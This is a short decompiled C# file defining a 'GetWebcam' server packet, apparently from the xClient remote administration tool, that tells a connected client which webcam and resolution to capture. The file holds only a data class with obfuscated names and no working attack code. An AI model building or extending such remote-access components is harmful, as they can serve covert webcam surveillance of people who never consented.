using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetWebcam : GInterface4
{
	public int Webcam { get; set; }

	public int Resolution { get; set; }

	public GetWebcam()
	{
	}

	public GetWebcam(int webcam, int resolution)
	{
		Webcam = webcam;
		Resolution = resolution;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
